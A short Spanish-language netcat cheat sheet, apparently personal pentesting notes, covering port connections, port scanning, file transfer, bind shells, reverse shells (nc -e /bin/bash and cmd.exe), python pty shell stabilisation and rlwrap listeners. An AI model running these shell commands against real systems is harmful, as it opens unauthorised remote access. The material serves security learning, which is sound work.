### Descargar Netcat para Windows
	https://eternallybored.org/misc/netcat/

### Conexion a puertos
	Servidor
	nc -lvp 1000
	
	Cliente
	nc 127.0.0.1 1000

### Conectar con DNS de google 
	nc -v -u 8.8.8.8 53

### Conectar a una Web
	nc -v plaintext.do 80
	GET / HTTP/1.1
	
### Escaneo de puertos 
	nc -z -vv plaintext.do 78-81
	nc -z -vv 185.199.109.153 78-81
	nc -z -vvn 185.199.109.153 78-81 | evitar inverse host lookup
	
### Transferencia de archivos
	Para Recibir 
	nc -lvnp 1000 > file.txt
	
	Para Enviar
	nc ipreceptor 1000 < file.txt 
	
	Usar md5sum para confirmar que el archivo transferido es identico al recibido
	md5sum file.txt 
	
### Transferencia de grupo de archivos y directorios 
	Para recibir 
	nc -lvnp 1000 | tar -xvf -
	
	Para enviar
	tar -cvf - directorio/ | nc 127.0.0.1 1000

### BindShell
	Servidor
	nc -lvnp 2000 -e /bin/bash (linux)
	nc -lvnp 2000 -e cmd.exe (windows)
	
	Cliente 
	nc 192.168.249.128 2000
	
### Reverse shell
	Servidor 
	nc 192.168.249.128 2000 -e /bin/bash (linux)
	nc 192.168.249.128 2000 -e cmd.exe (windows)
	
	Cliente 
	nc -lvnp 2000
	
	
### python pty 
	python -c "import pty;pty.spawn('/bin/bash')"
	CTRL + Z
	stty raw -echo
	fg
	ENTER

## rlwrap 
rlwrap - https://twitter.com/4lex/status/1099803151832633350

### Instalar rlwrap
	apt-get install rlwrap
	
#### Permite utilizar:
	Teclas de subir y bajar, para el historial de comandos.
	ctrl + L - (limpiar pantalla) 
	Tab auto completar (linux)
	
	rlwrap -c nc -lvnp 2000
	rlwrap -c nc 192.168.249.1 4444 -e /bin/bash 